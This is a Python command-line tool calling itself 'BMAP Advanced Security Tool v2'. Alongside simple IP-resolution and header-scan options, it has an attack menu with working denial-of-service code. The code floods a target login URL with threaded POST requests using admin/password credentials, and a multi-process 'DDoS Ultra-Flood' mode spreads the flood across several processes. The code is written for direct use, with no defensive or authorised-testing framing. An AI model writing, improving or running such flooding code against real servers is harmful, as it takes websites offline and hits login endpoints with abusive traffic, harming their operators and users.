import os
import sys
import time
import socket
import concurrent.futures
import requests
import multiprocessing
import threading

def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print("""\033[95m
  ____  __  __   _    ____ 
 | __ )|  \/  | / \  |  _ \\
 |  _ \\| |\/| |/ _ \\ | |_) |
 | |_) | |  | / ___ \\|  __/ 
 |____/|_|  |_/_/   \\_|_|    
    \033[0m\033[96m[!] BMAP Advanced Security Tool v2\033[0m
    """)

def ip_scan_menu():
    print("\n\033[93m[?] IP Scan Module\033[0m")
    target = input("\033[96m[?] Enter Target Domain or IP (e.g., google.com): \033[0m").strip()
    if not target:
        return
    print(f"\n\033[92m[*] Resolving IP for {target}...\033[0m")
    try:
        ip = socket.gethostbyname(target)
        print(f"\033[92m[+] Target IP Address: {ip}\033[0m")
    except Exception as e:
        print(f"\033[91m[-] Failed to resolve IP: {e}\033[0m")
    input("\nPress Enter to return...")

def link_scan_menu():
    print("\n\033[93m[?] Link Scan (Headers & Status) Module\033[0m")
    url = input("\033[96m[?] Enter Target URL (e.g., https://example.com): \033[0m").strip()
    if not url.startswith("http"):
        url = "http://" + url
    print(f"\n\033[92m[*] Scanning headers for {url}...\033[0m")
    try:
        response = requests.get(url, timeout=5)
        print(f"\033[92m[+] Status Code: {response.status_code}\033[0m")
        print(f"\033[92m[+] Server Type: {response.headers.get('Server', 'Unknown')}\033[0m")
        print(f"\033[92m[+] Content-Type: {response.headers.get('Content-Type', 'Unknown')}\033[0m")
    except Exception as e:
        print(f"\033[91m[-] Connection failed: {e}\033[0m")
    input("\nPress Enter to return...")

def attack_worker(url):
    try:
        session = requests.Session()
        session.post(url, data={'username': 'admin', 'password': 'password'}, timeout=3)
        return True
    except Exception:
        return False

def ddos_process_worker(url, threads_per_part, stop_event):
    session = requests.Session()
    adapter = requests.adapters.HTTPAdapter(pool_connections=threads_per_part, pool_maxsize=threads_per_part)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads_per_part) as executor:
        while not stop_event.is_set():
            futures = [executor.submit(attack_worker, url) for _ in range(threads_per_part)]
            concurrent.futures.wait(futures)

def dos_attack_menu():
    print("\n\033[93m[?] DoS (Login Flood) Module\033[0m")
    url = input("\033[96m[?] Enter Target Login URL: \033[0m").strip()
    if not url.startswith("http"):
        url = "http://" + url
        
    try:
        threads_count = int(input("\033[96m[?] Enter Threads count (e.g., 100): \033[0m"))
    except ValueError:
        threads_count = 50

    print(f"\n\033[92m[*] Launching DoS on {url} with {threads_count} threads...\033[0m")
    print("\033[93m[+] Attack running! Press Enter to stop...\033[0m")

    running = True
    def stop_listener():
        input()
        nonlocal running
        running = False

    t = threading.Thread(target=stop_listener, daemon=True)
    t.start()

    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads_count) as executor:
            while running:
                futures = [executor.submit(attack_worker, url) for _ in range(threads_count)]
                for future in concurrent.futures.as_completed(futures):
                    if not running:
                        break
    except KeyboardInterrupt:
        pass

    print(f"\n\033[91m[-] DoS Attack stopped.\033[0m")
    input("\nPress Enter to return...")

def ddos_attack_menu():
    print("\n\033[93m[?] DDoS (Multi-Process Ultra-Flood) Module\033[0m")
    url = input("\033[96m[?] Enter Target Login URL: \033[0m").strip()
    if not url.startswith("http"):
        url = "http://" + url
        
    try:
        total_threads = int(input("\033[96m[?] Enter Total Threads (e.g., 500): \033[0m"))
        num_parts = int(input("\033[96m[?] Enter Number of Parts/Processes (e.g., 5): \033[0m"))
    except ValueError:
        total_threads = 500
        num_parts = 5

    threads_per_part = max(1, total_threads // num_parts)

    print(f"\n\033[92m[*] Launching DDoS on {url} using {num_parts} parts ({threads_per_part} threads each)...\033[0m")
    print("\n\033[93m[+] DDoS running! Press Enter to stop...\033[0m")

    stop_event = multiprocessing.Event()
    def stop_listener():
        input()
        stop_event.set()

    t = threading.Thread(target=stop_listener, daemon=True)
    t.start()

    processes = []
    for _ in range(num_parts):
        p = multiprocessing.Process(target=ddos_process_worker, args=(url, threads_per_part, stop_event))
        p.daemon = True
        p.start()
        processes.append(p)

    while not stop_event.is_set():
        time.sleep(0.1)

    for p in processes:
        p.terminate()
        p.join()

    print(f"\n\033[91m[-] DDoS Attack stopped.\033[0m")
    input("\nPress Enter to return...")

def attack_main_menu():
    while True:
        banner()
        print("\033[92m[1] [+] DoS (Login Flood)")
        print("[2] [+] DDoS (Multi-Process Ultra-Flood)")
        print("[3] [<-] Back to Main Menu\033[0m")
        
        choice = input("\n\033[93m[?] Choose Attack Option (1-3): \033[0m").strip()
        
        if choice == '1':
            dos_attack_menu()
        elif choice == '2':
            ddos_attack_menu()
        elif choice == '3':
            break
        else:
            print("\n\033[91m[-] Invalid choice, try again.\033[0m")
            time.sleep(1)

def main():
    while True:
        banner()
        print("\033[92m[1] [+] IP Scan")
        print("[2] [+] Link Scan")
        print("[3] [+] Attack Menu (DoS & DDoS)")
        print("[4] [<-] Exit\033[0m")
        
        choice = input("\n\033[93m[?] Choose an option (1-4): \033[0m").strip()
        
        if choice == '1':
            ip_scan_menu()
        elif choice == '2':
            link_scan_menu()
        elif choice == '3':
            attack_main_menu()
        elif choice == '4':
            print("\n\033[91m[*] Exiting BMAP v2. Goodbye!\033[0m")
            sys.exit(0)
        else:
            print("\n\033[91m[-] Invalid choice, try again.\033[0m")
            time.sleep(1)

if __name__ == '__main__':
    multiprocessing.freeze_support()
    main()
